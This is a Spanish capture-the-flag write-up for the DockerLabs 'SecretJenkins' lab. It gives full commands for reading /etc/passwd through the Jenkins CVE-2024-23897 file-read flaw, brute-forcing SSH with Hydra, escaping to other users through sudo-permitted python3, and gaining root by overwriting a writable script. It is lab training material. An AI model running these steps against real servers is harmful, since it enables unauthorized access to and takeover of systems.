---
title: SecretJenkins - DockerLabs
published: true
categories: DockerLabs
---


| OS     | Dificultad  | Creator           |
| ------ | ----------- | -------------     | 
| Linux  |  Fácil      | El Pingüino de Mario        | 


# Reconocimiento

Comenzamos el proceso de reconocimiento identificando los puertos abiertos en el sistema objetivo. 
```shell
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG ports 
```
-  `-p-`: Escanea todos los puertos (1-65535).
- `--open`: Solo muestra los puertos abiertos.
- `-sS`: Realiza un escaneo SYN, que es rápido y discreto.
- `--min-rate=5000`: Envía al menos 5000 paquetes por segundo, acelerando el escaneo.
- `-n`: No realiza resolución DNS.
- `-Pn`: No realiza ping previo para determinar si el host está activo.
- `-vvv`: Muestra resultados detallados y en tiempo real.

![image](https://github.com/user-attachments/assets/f3015160-3c6a-41ed-8b7a-7e6f8d0ad54b)

Durante el escaneo, descubrimos que los siguientes puertos están activos:
- `22` (SSH)
- `8080` (HTTP)
A continuación, evaluamos si los puertos abiertos presentan alguna vulnerabilidad, además de obtener más información sobre los servicios asociados a esos puertos.
```bash
nmap -p22,8080 -sCV 172.17.0.2 -oG targeted
```
![image](https://github.com/user-attachments/assets/cc8124ce-96cb-4609-aa42-634a6fcdfba4)

# Exploración Web

En el puerto `8080` encontramos un servidor Jenkins que muestra un panel de inicio de sesión.

![image](https://github.com/user-attachments/assets/71cb5b57-8247-46cb-aeb0-e71f785d8faf)

Utilizamos `Gobuster` para realizar un reconocimiento web y explorar los directorios disponibles en el sitio.
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,doc,html,txt,img
```
- `gobuster dir` - Indica que estás utilizando la herramienta Gobuster para realizar un escaneo de directorios.
- `-u http://172.17.0.2/` Especifica la URL objetivo que deseas escanear en busca de directorios.
- `-w` Especifica que diccionario queremos usar
- `-x` Para indicar que tipo de extension queremos que nos encuentre

![image](https://github.com/user-attachments/assets/b3a7df30-cbf2-4314-a2b8-3e82bbd82fbd)

Explorando las rutas, verificamos que la versión de `Jenkins es 2.441`.

# LFI
La versión `2.441` de Jenkins es vulnerable a un LFI, según la vulnerabilidad documentada en [GitHub](https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2024-23897)

Para explotarla, descargamos el archivo `jenkins-cli.jar`:
```URL
http://172.17.0.2:8080/jnlpJars/jenkins-cli.jar
```
Con este archivo, ejecutamos el siguiente comando para intentar leer el archivo `/etc/passwd`:
```bash
java -jar jenkins-cli.jar -s http://172.17.0.2:8080/ -http connect-node "@/etc/passwd"
```

![image](https://github.com/user-attachments/assets/57ab7c6d-0ccc-404e-bd13-ed7292ca5a57)

# Fuerza Bruta 
Identificamos dos usuarios potenciales (`pinguinito` y `bobby`) y usamos `hydra` para realizar un ataque de fuerza bruta sobre SSH, encontrando una contraseña para `bobby`:
```bash
hydra -l bobby -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 
```
![image](https://github.com/user-attachments/assets/bbb6159d-c30f-4718-89b4-075b6b4f2ccf)

La contraseña de `bobby` es `chocolate`.

# Intrusion

Accedemos mediante SSH como el usuario `bobby`:

![image](https://github.com/user-attachments/assets/6bcb0254-2860-45d1-9668-6015c61c7f29)

Al ejecutar `sudo -l`, notamos que `bobby` tiene permisos para ejecutar `python3` como `pinguinito` .Utilizando [GTFOBins](https://gtfobins.github.io/gtfobins/awk/#shell) sabemos cómo explotar estos binarios.

```bash
sudo -u pinguinito /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
![image](https://github.com/user-attachments/assets/b0a36d6d-7206-4f69-b2fe-a3f0d9926dba)

Ahora estamos como el usuario `pinguinito`.

# Escalada de privilegios.

Volvemos a ejecutar `sudo -l`, notamos que `pinguinito` tiene permisos para ejecutar `python3` como `root` en `/opt/script.py
`.Utilizando [GTFOBins](https://gtfobins.github.io/gtfobins/awk/#shell) sabemos cómo explotar estos binarios.

![image](https://github.com/user-attachments/assets/690ab7ee-2455-4cdd-939c-b0c93837cf9e)

Observamos que el archivo es propiedad de `pinguinito`, lo que nos permite modificarlo.

![image](https://github.com/user-attachments/assets/61bd02cc-0fb5-4556-b1c6-4fc94d3f8aad)

Para editarlo, usamos comandos de escritura ya que no están habilitados ni `nano` ni `vim`:

![image](https://github.com/user-attachments/assets/d4346a5c-903a-4e99-8446-44d284d7250e)

```bash
chmod 744 /opt/script.py
echo "import os" > /opt/script.py
echo 'os.system("bash")' >> /opt/script.py
```

Ejecutamos el script y obtenemos acceso como root:

![image](https://github.com/user-attachments/assets/e11413ce-825d-4e27-b96d-2a59343f673a)
